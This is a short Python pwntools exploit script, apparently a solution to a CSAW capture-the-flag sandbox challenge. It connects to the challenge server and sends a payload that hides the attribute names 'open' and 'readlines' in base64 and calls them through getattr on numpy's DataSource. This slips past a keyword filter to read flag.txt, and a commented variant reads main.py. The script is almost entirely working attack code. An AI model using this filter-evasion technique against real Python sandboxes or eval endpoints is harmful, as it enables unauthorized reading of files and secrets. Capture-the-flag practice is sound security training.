import numpy as np
from pwn import *
import base64
context.log_level='debug'

r = remote("pwn.chal.csaw.io", 5011)
r.recv(timeout=2)
p_loads=r"RMbPOQHCzt.loads(b'flag.txt')"
p_data=r"RMbPOQHCzt.DataSource('www.baidu.com')\n"
p_data='''np = RMbPOQHCzt
ds = np.DataSource()
print(ds)
XXX=getattr(ds, HrjYMvtxwA(b'b3Blbg==').decode('utf-8'))
rp=XXX('flag.txt')
YYY=getattr(rp, HrjYMvtxwA(b'cmVhZGxpbmVz').decode('utf-8'))
print(YYY())
'''
r.sendline(p_data)
r.recv(timeout=2)
r.interactive()

#
# ds = np.DataSource()
# rp= ds.open('main.py')
# print(rp.readlines())
# # help(rp)